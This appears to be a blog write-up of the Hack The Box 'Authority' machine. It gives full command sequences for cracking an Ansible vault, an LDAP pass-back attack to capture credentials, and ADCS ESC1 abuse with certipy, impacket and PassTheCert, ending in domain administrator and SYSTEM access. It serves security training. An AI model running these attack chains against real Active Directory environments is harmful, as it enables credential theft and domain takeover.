summary: SMB enumeration reveals ansible configuration files for a running webserver that is hosting an LDAPS Server. In those files, contains an ansible vault that has a crackable password revealing credentials to the LDAP Server and executing a Pass-Back Attack revealing more sensitive credentials that are used for initial foothold. Later enumerating ADCS reveals ESC1 for Computer Accounts group which led to creating a computer account and spawning an LDAP-shell and adding the low-privileged user to the Administrators group gaining DA access

```

Scanning shows that a website with TLS enabled is open at port 8443. I'll check that out later let's go through SMB enumeration first

## Enumeration

Guest enumeration is enabled

```
❯ nxc smb authority.htb -u 'a' -p '' --users
```

![Description](/static/images/htb/windows/authority/1.jpg)


found some interesting shares

```
❯ smbclient -L authority.htb -U a%
```

![Description](/static/images/htb/windows/authority/2.jpg)

As I went through the directories I notice it was probably a lot of files, so I just recursively downloaded all of them

![Description](/static/images/htb/windows/authority/3.jpg)

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

![Description](/static/images/htb/windows/authority/4.jpg)

Now we can check them out slowly. The 4 folders have a lot of Ansible files but I only found these interesting:

`Automation/Ansible/PWM/defaults/main.yml`:

![Description](/static/images/htb/windows/authority/5.jpg)

`Automation/Ansible/PWM/templates/tomcat-users.xml.j2`:

![Description](/static/images/htb/windows/authority/6.jpg)

`Automation/Ansible/PWM/templates/ansible_inventory`:

![Description](/static/images/htb/windows/authority/7.jpg)

`Automation/Ansible/PWM/templates/README.md`:

![Description](/static/images/htb/windows/authority/8.jpg)

Now, checking out the website, we are greeted with a login page

![Description](/static/images/htb/windows/authority/9.jpg)

I tried all the different default usernames and passwords that we found earlier but that didn't work. I also tried looking up for some exploits for the
current version but to no avail.

Checking out at Github, PWM is an open source password self-service application for LDAP directories

![Description](/static/images/htb/windows/authority/10.jpg)

Looking at at the configuration manager page, the logs are authenticating as `svc_pwm`. This might be our user, we just need the password

![Description](/static/images/htb/windows/authority/11.jpg)

After looking around, turns out the Ansible file at `main.yml` file is an encrypted vault that we can bruteforce using 
ansible2john

## Cracking

![Description](/static/images/htb/windows/authority/12.jpg)

The file has 3 encrypted blobs in the same vault so I assumed the password was the same. We need to save one of the blobs in
a `yml` file

```
❯ ansible2john vault-pass.yml > vault-pass-hash.txt

❯ john --wordlist=/usr/share/wordlists/rockyou.txt vault-pass-hash.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)

❯ john vault-pass-hash.txt --show 
vault-pass.yml:!@#$%^&*

1 password hash cracked, 0 left
```

Nice, we have the password. Now we need to crack the vault, we will use the `ansible-vault` utility

```
❯ ansible-vault decrypt pwm_admin.yml --output decrypted_vault_uname.txt
Vault password: 
Decryption successful
 

❯ ansible-vault decrypt ldap_admin_pass.yml --output decrypted_vault_ldap_pass.txt
Vault password: 
Decryption successful

  
❯ ansible-vault decrypt pwm_admin_pass.yml --output decrypted_vault_admin_pass.txt 
Vault password: 
Decryption successful
```

![Description](/static/images/htb/windows/authority/14.jpg)

Tried to verify the `svc_ldap` credentials but they are not valid

```
❯ nxc smb authority.htb -u 'svc_ldap' -p 'DevT3st@123'
```

![Description](/static/images/htb/windows/authority/13.jpg)

Then I tried to login to the configuration webpage with `pWm_@dm!N_!23` and it worked

![Description](/static/images/htb/windows/authority/15.jpg)

## Gaining Access

Since this looked like an LDAP configuration page, I opted to try the Pass-back Attack like I did in [Return](https://mfkrypt.github.io/blog/htb/machines/windows/return#recon)

Start a listener

```
❯ nc -lvnp 389
```

![Description](/static/images/htb/windows/authority/16.jpg)

Now we change the address to our listener setup

```
ldaps://10.10.14.72:389
```

Click on the 'Test LDAP Profile', then we get a callback but something happens

![Description](/static/images/htb/windows/authority/17.jpg)

Looks like a bunch of junk because of the LDAP over SSL connection, LDAPS protocol even though we changed the port. We just need
to input ldap instead of ldaps

```
ldap://10.10.14.72:389
```

Repeat the same process and we should get the cleartext credentials

![Description](/static/images/htb/windows/authority/18.jpg)

Got em, also turns out we could also use Responder for this

```
❯ sudo responder -I tun0 -v
```

![Description](/static/images/htb/windows/authority/19.jpg)

verify the credentials

![Description](/static/images/htb/windows/authority/20.jpg)

Nice! we can also WinRM inside the machine and get the user flag

![Description](/static/images/htb/windows/authority/21.jpg)

## Privilege Escalation

I tried to run Winpeas but didn't found anything useful. So i ran Bloodhound

![Description](/static/images/htb/windows/authority/22.jpg)

There were no Outbound Object Control ACLs for `svc_ldap` but I found this unusual group, `Certificate Service DCOM Access`.
I did a bit of research and turns out there was a Blackhat Talk about getting Domain Admin with DCOM

https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf

Also contains a link to a Youtube video that demonstrates the exploit

https://www.youtube.com/watch?v=OHwjeGUSM4w

Here are the steps:

![Description](/static/images/htb/windows/authority/23.jpg)

However, we have to modify a few things since our situation is a little bit different. Firstly, enumerate ADCS for vulnerable templates

```
❯ certipy find -u svc_ldap -p lDaP_1n_th3_cle4r! -target authority.htb -stdout -vulnerable
```

![Description](/static/images/htb/windows/authority/24.jpg)

we can clearly see ESC1 here and might think this is an easy win but the thing here is we can only request a certificate if we are
part of the `Domain Computers` group that we are not part of currently. So, we need to add a new computer to the domain. We need to check if
we can add a computer by inspecting the `MachineAccountQuota` attribute.

```
❯ nxc ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
```

![Description](/static/images/htb/windows/authority/25.jpg)

### Using LDAP-Shell

Attack path:

1. Create a Rogue Computer
2. Exploit ESC1 as Computer Account
3. Request Administrator certificate
4. Authenticate using LDAP-Shell
5. Add low-priv user to `Administrators` group

Perfect, we can add up to 10 computers. Now, let us add the rogue computer

```
❯ impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password123!' -dc-host 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
```

![Description](/static/images/htb/windows/authority/26.jpg)

Then, we give delegation rights from our rogue computer to the target machine

```
❯ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'AUTHORITY$' -action write authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.129.229.56 -use-ldaps
```

![Description](/static/images/htb/windows/authority/27.jpg)

That didn't work and I got this error which was odd because the `msDS-Allowedtoactonbehalfofotheridentity` attribute was supposed to be empty.
So I tried to enumerate ADCS using the rogue computer

```
❯ certipy req -u 'ATTACKERSYSTEM$' -p 'Password123!' -dc-ip 10.129.229.56 -target authority.htb -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -target-ip 10.129.229.56
```

![Description](/static/images/htb/windows/authority/28.jpg)

That worked, now we authenticate using the certificate

```
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.229.56'
```

![Description](/static/images/htb/windows/authority/29.jpg)

Also doesn't work, did some ChatGPT'ing and Googling explained that the DC does not support PKINIT buttttttt we can try using LDAP
which supports Schannel, authentication throigh TLS. Spawning an LDAP shell

```
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.229.56' -ldap-shell
```

It works! we authenticated as Administrator but right now we can't directly grab the flag. However, we can execute LDAP commands like
changing permissions or adding our user to the `Administrators` group :)

```
# get_user_groups Administrator

CN=Administrators,CN=Builtin,DC=authority,DC=htb
CN=Schema Admins,CN=Users,DC=authority,DC=htb
CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
CN=Domain Admins,CN=Users,DC=authority,DC=htb
CN=Group Policy Creator Owners,CN=Users,DC=authority,DC=htb
CN=Denied RODC Password Replication Group,CN=Users,DC=authority,DC=htb

# add_user_to_group svc_ldap Administrators

Adding user: svc_ldap to group Administrators result: OK
```

Let's verify it worked

```Powershell
*Evil-WinRM* PS C:\Users\svc_ldap> net user svc_ldap
```

Yep, now we can manually grab the flag from `Administrator`'s `Desktop`

### PassTheCert

Now, for the 2nd method that is a little bit different,

Attack path:

1. Create a Rogue Computer
2. Delegate rights from rogue computer to target machine
3. S4U2Self/S4U2Proxy to request Service Ticket
4. Authenticate using Kerberos

Continuing our original path, we discovered earlier that the DC does not support PKINIT authentication,
we need to split the Private Key file and the Certificate file

```
❯ certipy cert -pfx administrator.pfx -nocert -out administrator.key
❯ certipy cert -pfx administrator.pfx -nokey -out administrator.crt
```

Impacket's rbcd tool does not have a method to authenticate with certificates, so we will use this tool, [PassTheCert.py](https://github.com/AlmondOffSec/PassTheCert)
. It also has the ability the write RBCDs and delegate rights

![Description](/static/images/htb/windows/authority/34.jpg)

```
❯ python3 ../../tools/AD-box/PassTheCert/Python/passthecert.py -action write_rbcd -crt administrator.crt -key administrator.key -delegate-to 'AUTHORITY$' -delegate-from 'ATTACKERSYSTEM$' -dc-ip 10.129.241.30 -domain authority.htb
```

Now, we request a Service Ticket to the CIFS service on behalf of `Administrator` using S4U2Proxy

```
❯ impacket-getST -spn cifs/authority.htb -impersonate Administrator authority.htb/ATTACKERSYSTEM$:Password123!
```

It fails, based on the error response I assumed it had to do with some of domain resolving issues. I went back to the initial ADCS enumeration command and noticed this
DNS being failed to resolve

![Description](/static/images/htb/windows/authority/37.jpg)

I added that to my `hosts` file:

```
<IP>   authority.authority.htb authority.htb
```

```
❯ impacket-getST -spn cifs/authority.authority.htb -impersonate Administrator authority.htb/ATTACKERSYSTEM$:Password123!
```

![Description](/static/images/htb/windows/authority/38.jpg)

It worked, now we export the ticket to the `KRB5CCNAME` variable

```
export KRB5CCNAME=Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache
```

Authenticate using Kerberos and get a shell as SYSTEM

```
impacket-psexec authority.htb/administrator@authority.authority.htb -k -no-pass
```
